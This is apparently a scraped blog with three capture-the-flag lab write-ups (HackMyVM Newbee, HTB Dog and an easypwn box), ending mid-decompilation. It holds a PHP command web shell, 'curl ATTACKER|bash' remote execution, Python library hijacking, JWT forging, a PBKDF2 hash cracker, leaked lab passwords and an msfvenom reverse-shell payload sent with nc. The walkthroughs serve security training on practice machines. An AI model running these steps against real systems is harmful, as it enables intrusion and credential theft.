[Size: 280]\rProgress: 441120 / 441122 (100.00%)\r===============================================================\rFinished\r=============================================================== Own www-data #\rå‘ç°å­˜åœ¨secret.phpï¼Œå¹¶ä¸”å¯ä»¥é€šè¿‡hackå‚æ•°åŒ…å«åˆ°index.phpå½“ä¸­\næŸ¥çœ‹secret.phpæºç ï¼Œå‘ç°åªéœ€è¦è®¾ç½®Cookieå°±èƒ½æ‰§è¡Œå‘½ä»¤\n[root@kali] /home/kali/debian â¯ cat secret.txt|base64 -d ......\r......\r\u0026lt;div class=\u0026#34;console\u0026#34;\u0026gt;\r\u0026lt;div class=\u0026#34;output\u0026#34; id=\u0026#34;output\u0026#34;\u0026gt;\r\u0026lt;?php\rif (isset($_COOKIE[\u0026#39;AreYouAdmin\u0026#39;]) \u0026amp;\u0026amp; $_COOKIE[\u0026#39;AreYouAdmin\u0026#39;] === \u0026#39;Yes\u0026#39;) {\rif (isset($_GET[\u0026#39;command\u0026#39;])) {\r$command = $_GET[\u0026#39;command\u0026#39;];\r$output = shell_exec($command);\recho \u0026#39;\u0026lt;div\u0026gt;\\\u0026gt; \u0026#39; . htmlspecialchars($command) . \u0026#39;\u0026lt;/div\u0026gt;\u0026#39;;\recho \u0026#39;\u0026lt;div\u0026gt;\u0026#39; . nl2br(htmlspecialchars($output)) . \u0026#39;\u0026lt;/div\u0026gt;\u0026#39;;\r}\r} else {\recho \u0026#39;\u0026lt;div\u0026gt;No permission to execute commands, lacking admin permission.\u0026lt;/div\u0026gt;\u0026#39;;\r}\r?\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;div class=\u0026#34;input-container\u0026#34;\u0026gt;\r\u0026lt;span class=\u0026#34;prompt\u0026#34;\u0026gt;\\\u0026gt;\u0026lt;/span\u0026gt;\r\u0026lt;form method=\u0026#34;get\u0026#34;\u0026gt;\r\u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;command\u0026#34; id=\u0026#34;input\u0026#34; placeholder=\u0026#34;command...\u0026#34; autocomplete=\u0026#34;off\u0026#34;\u0026gt;\r\u0026lt;/form\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;script\u0026gt;\rconst inputField = document.getElementById(\u0026#34;input\u0026#34;);\rinputField.focus();\r\u0026lt;/script\u0026gt;\r\u0026lt;/body\u0026gt;\r\u0026lt;/html\u0026gt; http://192.168.237.155/secret.php?command=curl 192.168.237.147/shell.sh|bash Own debian #\ræŸ¥çœ‹www-dataçš„ç‰¹æ®Šå‘½ä»¤\nwww-data@debian:/var/www/html/shop$ sudo -l\rsudo -l\rMatching Defaults entries for www-data on debian:\renv_reset, mail_badpass,\rsecure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin,\rtargetpw, use_pty\rUser www-data may run the following commands on debian:\r(debian) NOPASSWD: /usr/bin/python3 /var/www/html/vuln.py æŸ¥çœ‹vuln.pyçš„å…·ä½“å†…å®¹ï¼Œä»£ç æ²¡æœ‰ä»»ä½•æ„ä¹‰\nwww-data@debian:/var/www/html$ cat vuln.py\rcat vuln.py\rimport random\rimport time\rimport math\rimport string\rimport datetime\rdef generate_random_string(length=10):\rreturn \u0026#39;\u0026#39;.join(random.choices(string.ascii_letters + string.digits, k=length))\rdef pointless_computation():\rnumber = random.randint(1, 1000)\rresult = math.sqrt(number) * math.log(number)\rprint(f\u0026#34;Calculated math nonsense: sqrt({number}) * log({number}) = {result}\u0026#34;)\rdef simulate_time_wasting():\rnow = datetime.datetime.now()\rprint(f\u0026#34;Started wasting time at {now}\u0026#34;)\rtime.sleep(2) # æ•…æ„ç¡çœ  2 ç§’\rlater = datetime.datetime.now()\rprint(f\u0026#34;Finished wasting time at {later}. Time wasted: {later - now}\u0026#34;)\rdef pointless_string_operations():\rrand_str = generate_random_string()\rprint(f\u0026#34;Generated random string: {rand_str}\u0026#34;)\rreversed_str = rand_str[::-1]\rprint(f\u0026#34;Reversed string: {reversed_str}\u0026#34;)\rprint(f\u0026#34;String length: {len(rand_str)}\u0026#34;)\rif __name__ == \u0026#34;__main__\u0026#34;:\rpointless_computation()\rsimulate_time_wasting()\rpointless_string_operations()\rprint(\u0026#34;All done. The script accomplished nothing useful.\u0026#34;) ä¸è¿‡å½“å‰ç›®å½•æ˜¯å¯ä»¥å†™å…¥çš„\nè¿›è¡Œåº“åŠ«æŒï¼Œä¿®æ”¹datetimeçš„ä»£ç \nwww-data@debian:/var/www/html$ wget 192.168.237.147/datetime.py\rwget 192.168.237.147/datetime.py\r--2025-03-08 22:25:21-- http://192.168.237.147/datetime.py\rConnecting to 192.168.237.147:80... connected.\rHTTP request sent, awaiting response... 200 OK\rLength: 88 [text/x-python]\rSaving to: \u0026#39;datetime.py\u0026#39;\r0K 100% 17.5M=0s\r2025-03-08 22:25:21 (17.5 MB/s) - \u0026#39;datetime.py\u0026#39; saved [88/88]\rwww-data@debian:/var/www/html$ cat datetime.py\rcat datetime.py\rimport os\rclass datetime():\rdef now():\ros.system(\u0026#34;/bin/bash -p\u0026#34;) ç„¶åæ‰§è¡Œsudoï¼Œå³å¯è·å–åˆ°debiançš„æƒé™ï¼Œå¯ä»¥å†™å…¥**/home/.ssh/authorized_keysæ¥è¿›è¡Œssh**å¯†é’¥ç™»å½•\nç™»å½•æ‹¿åˆ°User.txt\nRoot #\råœ¨**/home/debian**ç›®å½•ä¸‹çœ‹åˆ°å¦å¤–ä¸¤ä¸ªæ–‡ä»¶\ndebian@debian:~$ cat config.php \u0026lt;?php\r$servername = \u0026#34;localhost\u0026#34;;\r$username = \u0026#34;root\u0026#34;;\r$password = \u0026#34;\r$conn = new mysqli($servername, $username, $password);\r............\r............\rdebian@debian:~$ cat note.txt Damn it, I forgot my database password. I heard that Debian is currently building a message board, maybe he can help me æŸ¥çœ‹**/var/www/html/flask/main.pyç»“æœæ²¡æœ‰æƒé™ï¼Œå†æŸ¥çœ‹ç«¯å£å¼€æ”¾äº†127.0.0.1:5000**\nä½¿ç”¨sshç«¯å£è½¬å‘\n[root@kali] /home/kali â¯ ssh -i ~/.ssh/id_rsa debian@192.168.237.155 -L 5000:127.0.0.1:5000 åœ¨ç½‘é¡µæºç ä¸­å‘ç°äº†ç½‘ç«™ä½¿ç”¨çš„å¯†é’¥éå¸¸ç®€å•\nå¯ä»¥ä»»æ„ç™»å½•ä¸€ä¸ªç”¨æˆ·ï¼Œæ¯”å¦‚ 123:123ï¼Œä¼šå¾—åˆ°ä¸€ä¸ªtoken\nè¿›è¡Œè§£å¯†ğŸ‘‰JSON Web Tokens - jwt.io\nä½¿ç”¨johnè¿›è¡Œçˆ†ç ´ï¼Œå¾—åˆ°KEY\nå¯ä»¥ä½¿ç”¨pythonè„šæœ¬æ¥ç”Ÿæˆjwttoken\nimport jwt\rimport datetime\r# ç”¨äºåŠ å¯†çš„å¯†é’¥\rSECRET_KEY = \u0026#39;noob\u0026#39;\r# ç”ŸæˆJWTçš„è½½è·\rpayload = {\r\u0026#39;username\u0026#39;: \u0026#39;admin\u0026#39;,\r\u0026#39;exp\u0026#39;: datetime.datetime.utcnow() + datetime.timedelta(hours=1) # è®¾ç½®è¿‡æœŸæ—¶é—´ä¸º1å°æ—¶\r}\r# ä½¿ç”¨ pyjwt åŠ å¯†ç”Ÿæˆ JWT\rencoded_jwt = jwt.encode(payload, SECRET_KEY, algorithm=\u0026#39;HS256\u0026#39;)\rprint(\u0026#34;Encoded JWT:\u0026#34;, encoded_jwt) ä½¿ç”¨burpsuiteè¿›è¡ŒæŠ“åŒ…æ›¿æ¢tokenï¼Œå¾—åˆ°mysqlçš„ç™»å½•å‡­è¯\nMysql account root:ThePasswordYouNeverCracked åœ¨æ•°æ®åº“ä¸­å‘ç°ä¸€æ®µå“ˆå¸Œå€¼ï¼Œä½¿ç”¨pbkdf2è¿›è¡ŒåŠ å¯†çš„\nå¯ä»¥ä½¿ç”¨ä¸‹é¢çš„è„šæœ¬è¿›è¡Œç ´è§£ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨\nimport hashlib\rimport binascii\rdef pbkdf2_hash(password, salt, iterations=50500, dklen=60):\rhash_value = hashlib.pbkdf2_hmac(\r\u0026#39;sha256\u0026#39;,\rpassword.encode(\u0026#39;utf-8\u0026#39;),\rsalt,\riterations,\rdklen\r)\rreturn hash_value\rdef find_matching_password(dictionary_file, target_hash, salt, iterations=50500, dklen=60):\rtarget_hash_bytes = binascii.unhexlify(target_hash)\rwith open(dictionary_file, \u0026#39;r\u0026#39;, encoding=\u0026#39;utf-8\u0026#39;) as file:\rcount = 0\rfor line in file:\rpassword = line.strip()\rhash_value = pbkdf2_hash(password, salt, iterations, dklen)\rcount += 1\rprint(f\u0026#34;Check {count}: {password}\u0026#34;)\rif hash_value == target_hash_bytes:\rprint(f\u0026#34;\\nFound password: {password}\u0026#34;)\rreturn password\rprint(\u0026#34;Password not found.\u0026#34;)\rreturn None\rsalt = binascii.unhexlify(\u0026#39;8bf3e3452b78544f8bee9400d6936d34\u0026#39;)\rtarget_hash = \u0026#39;2c082e3ff2ca15e3b24f815d70653f0dead09534495069dd140e19adb2d117266cc4b1de8daf55c7c4827a0a5ccf70c6f537ffc4ddc74db4865c41c0\u0026#39;\rdictionary_file = \u0026#39;/usr/share/wordlists/rockyou.txt\u0026#39;\rfind_matching_password(dictionary_file, target_hash, salt) ç ´è§£å¾—åˆ°å¯†ç ï¼š1qaz2wsx\næ‹¿åˆ°å¯†ç ååœ¨**/home/debian/.secret**ç›®å½•ä¸‹å‘ç°ä¸€ä¸ªå‹ç¼©åŒ…\næ³¨æ„ï¼ï¼ï¼ï¼ï¼\nç»è¿‡ä¿®æ”¹åçš„é¶æœºï¼Œè¿™é‡Œå®é™…ä¸Šæ˜¯MD5ç›´æ¥åŠ å¯†æ“ä½œï¼Œè€Œéå¼‚æˆ–ï¼ï¼\nè¿›è¡Œå¼‚æˆ–æ“ä½œï¼Œå¾—åˆ°å‹ç¼©åŒ…çš„å¯†ç æ˜¯ï¼šmjucwnilynkktf\nå°†root.zipä¼ åˆ°kalié‡Œé¢ï¼Œè§£å¯†\nå¾—åˆ°çš„æ˜¯ä¸€å¼ æ¨¡ç³Šçš„å›¾ç‰‡\nè¿™é‡Œéœ€è¦ä½¿ç”¨åˆ°ä¸€ä¸ªå·¥å…·\nspipm/Depixelization_poc: Depix is a PoC for a technique to recover plaintext from pixelized screenshots. æŸ¥çœ‹output.pngï¼Œå‘ç°ä¸Githubä¸Šçš„ç›¸åŒ\nå¾—åˆ°rootçš„å¯†ç \nroot:hellofromtheotherside Summary #\rUserï¼šé€šè¿‡å¯¹å‚æ•°çˆ†ç ´ç„¶åè¿›è¡Œæ–‡ä»¶åŒ…å«å¾—åˆ°secret.phpçš„æºä»£ç ï¼Œè®¾ç½®cookieä¹‹åå¯ä»¥åå¼¹åˆ°www-dataçš„shellã€‚é€šè¿‡åŠ«æŒvuln.pyçš„datetimeåº“ï¼Œå°†æƒé™æå‡åˆ°äº†debianã€‚\nRootï¼šé€šè¿‡debianå®¶ç›®å½•ä¸‹çš„å‡ ä¸ªæ–‡ä»¶çº¿ç´¢ï¼Œåœ¨127.0.0.1:5000ç«¯å£ä¸Šçš„flaskæœåŠ¡ä¸­ï¼Œé€šè¿‡çˆ†ç ´jwt secret keyï¼Œå¾—åˆ°mysqlçš„ç™»å½•å‡­è¯ã€‚åœ¨mysqlä¸­è·å–åˆ°äº†pbkdf2åŠ å¯†çš„å“ˆå¸Œå€¼ï¼Œè¿›è¡Œçˆ†ç ´å¾—åˆ°æ˜æ–‡å¯†ç ã€‚åœ¨**/home/debian/.secret/ä¸­å‘ç°ä¸€ä¸ªåŠ å¯†çš„zipæ–‡ä»¶ï¼Œä»¥åŠéœ€è¦è¿›è¡ŒXORå¼‚æˆ–è¿ç®—çš„æç¤ºã€‚è§£å¯†åè§£å‹root.zip**ï¼Œå¾—åˆ°ä¸€å¼ æ¨¡ç³Šçš„å›¾ç‰‡ã€‚å¯ä»¥ä½¿ç”¨Depixå·¥å…·è¿˜åŸï¼Œå¾—åˆ°ä¸Githubä¸Šç›¸åŒå¯†ç æ˜¯hellofromtheothersideï¼Œæå‡åˆ°rootæƒé™ã€‚\n","date":"2025-03-09","externalUrl":null,"permalink":"/posts/2025/03/hackmyvm-newbee/","section":"Posts","summary":"","title":"HackMyVM-Newbee","type":"posts"},{"content":"\rBox Info #\rOS Linux Difficulty Easy Nmap #\r[root@kali] /home/kali/Dog â¯ nmap dog.htb -sV -A -Pn -T4 PORT STATE SERVICE VERSION\r22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)\r| ssh-hostkey: | 3072 97:2a:d2:2c:89:8a:d3:ed:4d:ac:00:d2:1e:87:49:a7 (RSA)\r| 256 27:7c:3c:eb:0f:26:e9:62:59:0f:0f:b1:38:c9:ae:2b (ECDSA)\r|_ 256 93:88:47:4c:69:af:72:16:09:4c:ba:77:1e:3b:3b:eb (ED25519)\r80/tcp open http Apache httpd 2.4.41 ((Ubuntu))\r| http-git: | 10.10.11.58:80/.git/\r| Git repository found!\r| Repository description: Unnamed repository; edit this file \u0026#39;description\u0026#39; to name the...\r|_ Last commit message: todo: customize url aliases. reference:https://docs.backdro...\r|_http-server-header: Apache/2.4.41 (Ubuntu)\r|_http-generator: Backdrop CMS 1 (https://backdropcms.org)\r| http-robots.txt: 22 disallowed entries (15 shown)\r| /core/ /profiles/ /README.md /web.config /admin | /comment/reply /filter/tips /node/add /search /user/register |_/user/password /user/login /user/logout /?q=admin /?q=comment/reply\r|_http-title: Home | Dog å¯ä»¥å‘ç°nmapç›´æ¥æ‰«æåˆ°äº†**/.git**ç›®å½•\nGitDump #\r[root@kali] /home/kali/Dog â¯ git-dumper http://dog.htb/.git/ ./dog-git ç”±äºå­˜åœ¨ä¸€ä¸ªç™»å½•é¡µé¢ï¼Œæˆ‘ä»¬éœ€è¦å¯»æ‰¾åˆ°å­˜åœ¨çš„ç”¨æˆ·ï¼štiffany\n[root@kali] /home/kali/Dog/dog-git (master) â¯ grep -r \u0026#34;@dog.htb\u0026#34;\rfiles/config_83dddd18e1ec67fd8ff5bba2453c7fb3/active/update.settings.json: \u0026#34;tiffany@dog.htb\u0026#34; æŸ¥çœ‹settings.phpä¸­ï¼Œå¾—åˆ°mysqlæ•°æ®åº“çš„å¯†ç \n[root@kali] /home/kali/Dog/dog-git (master) â¯ head settings.php -n 20\r\u0026lt;?php\r/**\r* @file\r* Main Backdrop CMS configuration file.\r*/\r/**\r* Database configuration:\r*\r* Most sites can configure their database by entering the connection string\r* below. If using primary/replica databases or multiple connections, see the\r* advanced database documentation at\r* https://api.backdropcms.org/database-configuration\r*/\r$database = \u0026#39;mysql://root:BackDropJ2024DS2024@127.0.0.1/backdrop\u0026#39;;\r$database_prefix = \u0026#39;\u0026#39;;\r/**\r* Site configuration files location.\r* ç™»å½•tiffanyçš„ç”¨æˆ·æ¥åˆ°åå°\ntiffany:BackDropJ2024DS2024 Own www-data #\rå‘ç°ä¸€ä¸ªå¯ä»¥ä¸Šä¼ æ–‡ä»¶çš„é¡µé¢\nè¿›å…¥åˆ°Manual installation\nè¿™é‡Œåªå…è®¸ä¸Šä¼ tar tgz gz bz2æ ¼å¼\nè¿™é‡Œæˆ‘æ˜¯ä»å®˜ç½‘ä¸Šä¸‹è½½äº†ä¸€ä¸ªæ¨¡å—\nModules for Backdrop CMS | Backdrop CMS è§£å‹åä¿®æ”¹è¿™ä¸ªåœ°æ–¹\nç„¶åé‡æ–°æ‰“åŒ…æˆä¸€ä¸ªtar.gz\ntar -czvf bean.tar.gz * ä¸Šä¼ æˆåŠŸ\nEnableä¹‹åè®¿é—®è¿™ä¸ªè·¯å¾„å³å¯æ‰§è¡Œå‘½ä»¤ï¼Œå¾—åˆ°www-dataçš„shell\nOwn johncusack #\rè¿›å…¥mysql\nå‘ç°å­˜åœ¨æœ‰jobertçš„å¯†ç hashï¼Œä½†æ˜¯å¹¶ä¸èƒ½çˆ†ç ´ã€‚\nå°è¯•ä½¿ç”¨æ•°æ®åº“çš„å¯†ç æ¥ç™»å½•johncusackæˆåŠŸ\n[root@kali] /home/kali â¯ ssh johncusack@dog.htb #BackDropJ2024DS2024 Root #\ræŸ¥çœ‹ç‰¹æ®Šå‘½ä»¤\n-bash-5.0$ sudo -l\r[sudo] password for johncusack: Matching Defaults entries for johncusack on dog:\renv_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\rUser johncusack may run the following commands on dog:\r(ALL : ALL) /usr/local/bin/bee æŸ¥çœ‹å…·ä½“å†…å®¹\n\u0026lt;?php\r/**\r* @file\r* A command line utility for Backdrop CMS.\r*/\r// Exit gracefully with a meaningful message if installed within a web\r// accessible location and accessed in the browser.\rif (!bee_is_cli()) {\recho bee_browser_load_html();\rdie();\r}\r// Set custom error handler.\rset_error_handler(\u0026#39;bee_error_handler\u0026#39;);\r// Include files.\rrequire_once __DIR__ . \u0026#39;/includes/miscellaneous.inc\u0026#39;;\rrequire_once __DIR__ . \u0026#39;/includes/command.inc\u0026#39;;\rrequire_once __DIR__ . \u0026#39;/includes/render.inc\u0026#39;;\rrequire_once __DIR__ . \u0026#39;/includes/filesystem.inc\u0026#39;;\rrequire_once __DIR__ . \u0026#39;/includes/input.inc\u0026#39;;\rrequire_once __DIR__ . \u0026#39;/includes/globals.inc\u0026#39;;\r// Main execution code.\rbee_initialize_server();\rbee_parse_input();\rbee_initialize_console();\rbee_process_command();\rbee_print_messages();\rbee_display_output();\rexit();\r/**\r* Custom error handler for `bee`.\r*\r* @param int $error_level\r* The level of the error.\r* @param string $message\r* Error message to output to the user.\r* @param string $filename\r* The file that the error came from.\r* @param int $line\r* The line number the error came from.\r* @param array $context\r* An array of all variables from where the error was triggered.\r*\r* @see https://www.php.net/manual/en/function.set-error-handler.php\r* @see _backdrop_error_handler()\r*/\rfunction bee_error_handler($error_level, $message, $filename, $line, array $context = NULL) {\rrequire_once __DIR__ . \u0026#39;/includes/errors.inc\u0026#39;;\r_bee_error_handler_real($error_level, $message, $filename, $line, $context);\r}\r/**\r* Detects whether the current script is running in a command-line environment.\r*/\rfunction bee_is_cli() {\rreturn (empty($_SERVER[\u0026#39;SERVER_SOFTWARE\u0026#39;]) \u0026amp;\u0026amp; (php_sapi_name() == \u0026#39;cli\u0026#39; || (is_numeric($_SERVER[\u0026#39;argc\u0026#39;]) \u0026amp;\u0026amp; $_SERVER[\u0026#39;argc\u0026#39;] \u0026gt; 0)));\r}\r/**\r* Return the HTML to display if this page is loaded in the browser.\r*\r* @return string\r* The concatentated html to display.\r*/\rfunction bee_browser_load_html() {\r// Set the title to use in h1 and title elements.\r$title = \u0026#34;Bee Gone!\u0026#34;;\r// Place a white block over \u0026#34;#!/usr/bin/env php\u0026#34; as this is output before\r// anything else.\r$browser_output = \u0026#34;\u0026lt;div style=\u0026#39;background-color:white;position:absolute;width:15rem;height:3rem;top:0;left:0;z-index:9;\u0026#39;\u0026gt;\u0026amp;nbsp;\u0026lt;/div\u0026gt;\u0026#34;;\r// Add the bee logo and style appropriately.\r$browser_output .= \u0026#34;\u0026lt;img src=\u0026#39;./images/bee.png\u0026#39; align=\u0026#39;right\u0026#39; width=\u0026#39;150\u0026#39; height=\u0026#39;157\u0026#39; style=\u0026#39;max-width:100%;margin-top:3rem;\u0026#39;\u0026gt;\u0026#34;;\r// Add meaningful text.\r$browser_output .= \u0026#34;\u0026lt;h1 style=\u0026#39;font-family:Tahoma;\u0026#39;\u0026gt;$title\u0026lt;/h1\u0026gt;\u0026#34;;\r$browser_output .= \u0026#34;\u0026lt;p style=\u0026#39;font-family:Verdana;\u0026#39;\u0026gt;Bee is a command line tool only and will not work in the browser.\u0026lt;/p\u0026gt;\u0026#34;;\r// Add the document title using javascript when the window loads.\r$browser_output .= \u0026#34;\u0026lt;script\u0026gt;window.onload = function(){document.title=\u0026#39;$title\u0026#39;;}\u0026lt;/script\u0026gt;\u0026#34;;\r// Output the combined string.\rreturn $browser_output;\r} æ³¨æ„åˆ°è¿™é‡Œå­˜åœ¨ä¸€ä¸ªevalæ–¹æ³•\nè¿™ä¸ªå·¥å…·å¿…é¡»è¦åœ¨**/var/www/html**ä¸­å¯åŠ¨æ‰è¡Œï¼\nç„¶åå¼€å¯bashå°±è¡Œäº†\nSummary #\rUserï¼š/.gitæ³„éœ²æ‹¿åˆ°æºç ï¼Œéå†æ–‡ä»¶æŸ¥æ‰¾åˆ°äº†æ•°æ®åº“çš„å¯†ç ï¼Œä»¥åŠä¸€ä¸ªtiffanyç”¨æˆ·ã€‚è¿›å…¥åˆ°åå°å¯ä»¥ä¸Šä¼ ä¸€ä¸ªmoduleï¼Œè¿™é‡Œæˆ‘æ˜¯ç›´æ¥åˆ°Modules for Backdrop CMS | Backdrop CMSä¸­ä¸‹è½½ç„¶åä¿®æ”¹æºç çš„ï¼Œåå¼¹shellæ‹¿åˆ°www-dataçš„æƒé™ã€‚\nRootï¼šbeeæ˜¯Backdrop CMS çš„ä¸€ä¸ª å‘½ä»¤è¡Œå·¥å…·ï¼Œéœ€è¦åœ¨å…¶ä¸»ç›®å½•ä¸‹ä½¿ç”¨ã€‚é€šè¿‡å‘½ä»¤è¡Œæ‰§è¡Œphpçš„systemå‡½æ•°ï¼Œè·å–åˆ°rootçš„bashã€‚\n","date":"2025-03-09","externalUrl":null,"permalink":"/posts/2025/03/htb-dog/","section":"Posts","summary":"","title":"HTB-Dog","type":"posts"},{"content":"\rBox Info #\rOS Linux Difficulty Medium Nmap #\r[root@kali] /home/kali â¯ nmap 192.168.56.105 -sV -A -Pn -T4 -p-\rStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-03 14:36 CST\rNmap scan report for 192.168.56.105\rHost is up (0.00024s latency).\rNot shown: 65532 closed tcp ports (reset)\rPORT STATE SERVICE VERSION\r22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)\r| ssh-hostkey: | 2048 93:a4:92:55:72:2b:9b:4a:52:66:5c:af:a9:83:3c:fd (RSA)\r| 256 1e:a7:44:0b:2c:1b:0d:77:83:df:1d:9f:0e:30:08:4d (ECDSA)\r|_ 256 d0:fa:9d:76:77:42:6f:91:d3:bd:b5:44:72:a7:c9:71 (ED25519)\r80/tcp open http Apache httpd 2.4.59 ((Debian))\r|_http-title: Don\u0026#39;t Hack Me\r|_http-server-header: Apache/2.4.59 (Debian)\r6666/tcp open irc?\r| fingerprint-strings: | Help, Socks4, Socks5: | Hackers, get out of my machine\r| beast2: |_ start: 11\r|_irc-info: Unable to open connection 6666ç«¯å£åªèƒ½ç”¨ncè¿æ¥ï¼Œè¿›å…¥80ç«¯å£å‘ç°éœ€è¦æ‰«æç›®å½•\nGobuster #\r[root@kali] /home/kali/easypwn â¯ gobuster dir -u http://192.168.56.105 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html -t 50\r===============================================================\rGobuster v3.6\rby OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart)\r===============================================================\r[+] Url: http://192.168.56.105\r[+] Method: GET\r[+] Threads: 50\r[+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\r[+] Negative Status codes: 404\r[+] User Agent: gobuster/3.6\r[+] Extensions: php,txt,html\r[+] Timeout: 10s\r===============================================================\rStarting gobuster in directory enumeration mode\r===============================================================\r/.html (Status: 403) [Size: 279]\r/index.html (Status: 200) [Size: 930]\r/.html (Status: 403) [Size: 279]\r/mysecret.txt (Status: 200) [Size: 383]\r/server-status (Status: 403) [Size: 279]\rProgress: 882240 / 882244 (100.00%)\r===============================================================\rFinished\r=============================================================== /mysecret.txt\nGo to the most evil port.\rYou will get what you want.\rPlease be gentle with him, maybe he will be afraid.\rIn order to obtain its source code.\rPerhaps you will need the dictionary below.\r/YTlPX4d2UENbWnI.txt /YTlPX4d2UENbWnI.txt\nta0\rlingmj\rbamuwe\rtodd\rll104567\rprimary\rlvzhouhang\rqiaojojo\rflower Crack Zip #\rè®¿é—®**/ll104567**å¾—åˆ°ä¸€ä¸ªå‹ç¼©åŒ…\nä½†æ˜¯è§£å‹éœ€è¦å¯†ç ï¼Œè¿›è¡Œçˆ†ç ´\n[root@kali] /home/kali/easypwn â¯ zip2john ll104567 \u0026gt; zip.hash [root@kali] /home/kali/easypwn â¯ john zip.hash /usr/share/wordlists/rockyou.txt å¾—åˆ°ä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶\nIDA #\rä½¿ç”¨64ä½IDAè¿›è¡Œåç¼–è¯‘\nå¯ä»¥çœ‹åˆ°å¯¹è¾“å…¥æœ‰æ£€æµ‹ï¼Œå¦‚æœæ˜¯éæ³•å­—èŠ‚ä¼šæŠ¥é”™Hackersï¼Œç„¶åé€€å‡º\nç‚¹å‡»forbidden_bytesï¼ŒæŸ¥çœ‹è¿‡æ»¤äº†å“ªäº›\n\\x00\\x20\\x0F\\xCD\\x09\\x22\\x0A ç„¶åè¿›å…¥åˆ°ä¸‹ä¸€æ­¥\nå¦‚æœæ•°æ®åˆæ³•ï¼Œç¨‹åºé€šè¿‡ mmap64 å°†æ¥æ”¶åˆ°çš„æ•°æ®æ˜ å°„åˆ°å†…å­˜ä¸­ï¼Œå¹¶è°ƒç”¨å®ƒï¼ˆå³æ‰§è¡Œè¿™äº›æ•°æ®ï¼‰ã€‚å¦‚æœæ˜ å°„å¤±è´¥ï¼Œç¨‹åºä¼šè¾“å‡ºé”™è¯¯å¹¶å…³é—­è¿æ¥ã€‚\nå› æ­¤æ¥ä¸‹æ¥ç”Ÿæˆshellcodeå‘é€ï¼Œå¹¶ä¸”ç›‘å¬\næ³¨æ„è¿™é‡Œä¸è¦ä½¿ç”¨ç¼–ç å™¨ğŸ‘‡\n[root@kali] /home/kali/easypwn/opt â¯ msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.56.104 LPORT=4444 -f raw -b \u0026#39;\\x00\\x20\\x0F\\xCD\\x09\\x22\\x0A\u0026#39; -o shellcode_raw.bin å¦èµ·ä¸€ä¸ªmulti/handlerï¼Œç„¶åå‘é€ç»™ç«¯å£å³å¯\n[root@kali] /home/kali/easypwn/opt â¯ cat shellcode_raw.bin | nc 192.168.56.105 6666 Root #\rè¿˜æ˜¯å…ˆæŠŠid_rsa.pubå†™å…¥åˆ°**/home/lamb/.ssh/authorized_keysé‡Œé¢å»ï¼Œåé¢å¥½ssh**ç™»å½•æ“ä½œ\nè¯»å–tips.txt\nThere is a fun tool called cupp.\rI heard it\u0026#39;s a good social engineering dictionary generator.\rAre there really people that stupid these days? haha.\rThere is only one way to become ROOT, which is to execute getroot!!!\rAnd don\u0026#39;t forget, this is a PWN type machine.\ræœ‰ä¸€ä¸ªå¾ˆå¥½ç©çš„å·¥å…·å«åš cupp.\rå¬è¯´é‚£æ˜¯ä¸€ä¸ªä¸é”™çš„ç¤¾ä¼šå·¥ç¨‹å­¦å­—å…¸ç”Ÿæˆå™¨.\rç°åœ¨çœŸçš„è¿˜ä¼šæœ‰äººè¿™ä¹ˆè ¢å—ï¼Ÿhaha.\ræˆä¸º ROOT çš„æ–¹æ³•åªæœ‰ä¸€æ¡ï¼Œå°±æ˜¯æ‰§è¡Œ getroot !!!\rè€Œä¸”ä½ ä¸è¦å¿˜è®°äº†ï¼Œè¿™æ˜¯ä¸€ä¸ªpwnç±»å‹çš„æœºå™¨. æŸ¥çœ‹ä¸€ä¸‹getrootçš„ä½ç½®åœ¨å“ªé‡Œ\nç”¨ncæŠŠgetrootä¼ å‡ºæ¥\n# msf\rnc 192.168.56.104 9999 \u0026lt; getroot\r# kali\râ¯ nc -lvnp 9999 \u0026gt; getroot åŒæ ·è¿›è¡Œåç¼–è¯‘\nint __cdecl main(int argc, const char **argv, const char **envp)\r{\rdouble v3; // xmm0_8\r__int64 v4; // rax\r__int64 v5; // rax\r__int64 v6; // rdx\r__int64 v7; // rax\rint v8; // ebx\runsigned int v9; // eax\r__int64 v10; // rax\r__int64 v11; // rax\rchar v13[256]; // [rsp+10h] [rbp-260h] BYREF\r__int64 v14; // [rsp+110h] [rbp-160h] BYREF\rchar v15[32]; // [rsp+220h] [rbp-50h] BYREF\rint v16; // [rsp+240h] [rbp-30h] BYREF\rint v17; // [rsp+244h] [rbp-2Ch] BYREF\rint v18; // [rsp+248h] [rbp-28h] BYREF\rchar v19; // [rsp+24Fh] [rbp-21h] BYREF\rdouble v20; // [rsp+250h] [rbp-20h]\rint v21; // [rsp+258h] [rbp-18h]\rint v22; // [rsp+25Ch] [rbp-14h]\rif ( argc \u0026gt; 1 )\r{\rv22 = atoi(argv[1]);\rv9 = time(0LL);\rsrand(v9);\rv21 = rand() % 86400;\rgenerate_normal_distribution();\rv20 = v3;\rv16 = (int)(5.0 * v3) + v21;\rv17 = 86399;\rv10 = std::min\u0026lt;int\u0026gt;(\u0026amp;v16, \u0026amp;v17);\rv18 = 0;\rv16 = *(_DWORD *)std::max\u0026lt;int\u0026gt;(\u0026amp;v18, v10);\rstd::allocator\u0026lt;char\u0026gt;::allocator(\u0026amp;v19);\rstd::string::basic_string(v15, \u0026#34;/root/cred\u0026#34;, \u0026amp;v19);\rstd::allocator\u0026lt;char\u0026gt;::~allocator(\u0026amp;v19);\rif ( v22 == v16 + 12345 )\r{\rstd::ifstream::basic_ifstream(v13, v15, 8LL);\rif ( (unsigned __int8)std::ios::operator bool(\u0026amp;v14) )\r{\rv11 = 